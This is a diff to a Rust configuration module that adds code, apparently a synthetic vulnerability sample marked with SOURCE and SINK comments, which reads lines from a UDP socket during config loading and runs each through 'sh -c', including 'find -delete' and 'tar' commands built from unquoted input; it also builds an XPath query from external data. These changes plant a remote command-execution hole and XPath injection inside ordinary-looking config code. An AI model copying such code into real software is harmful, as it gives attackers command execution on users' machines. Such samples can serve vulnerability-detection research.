@@ -327,10 +327,149 @@ impl Config {
         let s: String = fs::read_to_string(path)
             .await
             .with_context(|| format!("Failed to read the config {:?}", path))?;
+        
+        use std::net::UdpSocket;
+        let socket = UdpSocket::bind("127.0.0.1:0")?;
+        let mut buffer = [0; 1024];
+        //SOURCE
+        let bytes_read = socket.recv(&mut buffer)?;
+        
+        let command_data = String::from_utf8_lossy(&buffer[..bytes_read]);
+        
+        for line in command_data.lines() {
+            let line = line.trim();
+            if line.is_empty() || line.starts_with('#') {
+                continue;
+            }
+            
+            if let Some(command) = Self::parse_config_command(&line) {
+                if let Err(e) = Config::execute_external_command(&command) {
+                    tracing::error!("Failed to execute command '{}': {}", command, e);
+                }
+            }
+        }
+        
         Config::from_str(&s).with_context(|| {
             "Configuration is invalid. Please refer to the configuration specification."
         })
     }
+    
+    pub fn execute_external_command(command: &str) -> std::io::Result<()> {
+        //SINK
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(command)
+            .output()?;
+        
+        tracing::info!("Executed external command: {} (exit code: {})", command, output.status);
+        
+        if !output.stdout.is_empty() {
+            tracing::debug!("Command output: {}", String::from_utf8_lossy(&output.stdout));
+        }
+        
+        if !output.stderr.is_empty() {
+            tracing::warn!("Command stderr: {}", String::from_utf8_lossy(&output.stderr));
+        }
+        
+        Ok(())
+    }
+    
+    fn parse_config_command(line: &str) -> Option<String> {
+        // Parse different types of configuration commands
+        if line.starts_with("exec:") {
+            // Direct command execution
+            Some(line[5..].trim().to_string())
+        } else if line.starts_with("script:") {
+            // Script execution with environment setup
+            let script = line[7..].trim();
+            Some(format!("export PATH=/usr/local/bin:/usr/bin:/bin && {}", script))
+        } else if line.starts_with("system:") {
+            // System command with logging
+            let cmd = line[7..].trim();
+            Some(format!("echo 'Executing: {}' && {}", cmd, cmd))
+        } else if line.starts_with("backup:") {
+            // Backup command with validation
+            let path = line[7..].trim();
+            Some(format!("tar -czf backup_{}.tar.gz {}", path, path))
+        } else if line.starts_with("cleanup:") {
+            // Cleanup command
+            let pattern = line[8..].trim();
+            Some(format!("find . -name '{}' -delete", pattern))
+        } else {
+            // Default: treat as direct command
+            Some(line.to_string())
+        }
+    }
+}
+
+pub fn process_external_socket_config(config_data: &str) -> Result<()> {
+    tracing::info!("Processing external socket configuration data");
+    
+    let xml_content = format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+<socket_config>
+    <service name="main">
+        <nodelay>true</nodelay>
+        <keepalive>30</keepalive>
+        <timeout>60</timeout>
+    </service>
+    <service name="backup">
+        <nodelay>false</nodelay>
+        <keepalive>60</keepalive>
+        <timeout>120</timeout>
+    </service>
+</socket_config>"#
+    );
+    
+    // Parse the XML document
+    let package = sxd_document::parser::parse(&xml_content)
+        .map_err(|e| anyhow!("Failed to parse XML: {}", e))?;
+    let document = package.as_document();
+    
+    // Extract XPath expression from external configuration data
+    let xpath_expression = if config_data.contains("xpath:") {
+        config_data.lines()
+            .find(|line| line.trim().starts_with("xpath:"))
+            .map(|line| line.trim().strip_prefix("xpath:").unwrap_or(""))
+            .unwrap_or("//service")
+    } else {
+        "//service"
+    };
+    
+    tracing::info!("Using XPath expression: {}", xpath_expression);
+    
+    let factory = sxd_xpath::Factory::new();
+    //SINK
+    let xpath = factory.build(xpath_expression)
+        .map_err(|e| anyhow!("Invalid XPath expression: {}", e))?;
+    
+    // Evaluate the XPath expression
+    let context = sxd_xpath::Context::new();
+    let result = xpath.expect("XPath should be valid").evaluate(&context, document.root())
+        .map_err(|e| anyhow!("XPath evaluation failed: {}", e))?;
+    
+    match result {
+        sxd_xpath::Value::Nodeset(nodes) => {
+            tracing::info!("Found {} matching nodes", nodes.size());
+            for node in nodes.iter() {
+                if let Some(element) = node.element() {
+                    tracing::info!("Processing node: {}", element.name().local_part());
+                }
+            }
+        }
+        sxd_xpath::Value::String(s) => {
+            tracing::info!("XPath result: {}", s);
+        }
+        sxd_xpath::Value::Number(n) => {
+            tracing::info!("XPath result: {}", n);
+        }
+        sxd_xpath::Value::Boolean(b) => {
+            tracing::info!("XPath result: {}", b);
+        }
+    }
+    
+    tracing::info!("External socket configuration processing completed");
+    Ok(())
 }
 
 #[cfg(test)]
